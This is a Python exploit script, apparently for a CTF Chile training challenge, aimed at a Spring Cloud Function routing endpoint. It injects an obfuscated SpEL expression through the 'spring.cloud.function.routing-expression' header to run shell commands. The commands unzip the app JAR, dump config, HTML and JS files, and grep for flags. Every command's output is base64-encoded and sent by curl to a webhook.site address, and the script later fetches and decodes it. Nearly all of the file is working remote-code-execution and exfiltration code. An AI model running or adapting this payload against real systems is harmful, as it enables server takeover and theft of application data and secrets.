#!/usr/bin/env python3
"""
CTF Chile - Extracción de archivos y búsqueda de flags
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:20} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Extrayendo y analizando app.jar...")
probe("extract_jar", "cd /tmp && unzip -q /app/app.jar && ls -la")
probe("jar_manifest", "cd /tmp && cat META-INF/MANIFEST.MF")
probe("jar_application_props", "cd /tmp && find . -name 'application*' | xargs cat 2>/dev/null")

print("[*] Buscando archivos HTML completos...")
probe("login_clean", "cd /tmp && cat static/login.html 2>/dev/null | head -30")
probe("register_clean", "cd /tmp && cat static/register.html 2>/dev/null | head -30")
probe("dashboard_clean", "cd /tmp && cat static/dashboard.html 2>/dev/null | head -30")

print("[*] Buscando archivos JavaScript...")
probe("js_files", "cd /tmp && find . -name '*.js' | head -10")
probe("main_js", "cd /tmp && find . -name '*.js' | xargs cat | head -50")

print("[*] Buscando flags directamente en archivos...")
probe("flag_in_jar", "strings /app/app.jar | grep -i 'ctfchile\\|flag{' | head -10")
probe("flag_in_static", "cd /tmp && find . -type f \\( -name '*.html' -o -name '*.js' -o -name '*.css' -o -name '*.properties' \\) -exec grep -l -i 'ctfchile\\|flag{' {} \\;")

print("[*] Explorando configuración Spring...")
probe("spring_classes", "cd /tmp && find . -name '*.class' | grep -i config | head -5")
probe("spring_props", "cd /tmp && find . -name '*.properties' -o -name '*.yml' | xargs cat 2>/dev/null")

print("[*] Buscando comentarios ocultos...")
probe("html_comments", "cd /tmp && find . -name '*.html' -exec grep -H '<!--' {} \\;")
probe("js_comments", "cd /tmp && find . -name '*.js' -exec grep -H '//' {} \\;")

time.sleep(12)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)
            # Buscar flags específicamente
            if "ctfchile{" in decoded.lower():
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")
                print("Contenido con flag:", decoded)
        except Exception as e:
            print(f"(decode error) {raw[:200]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")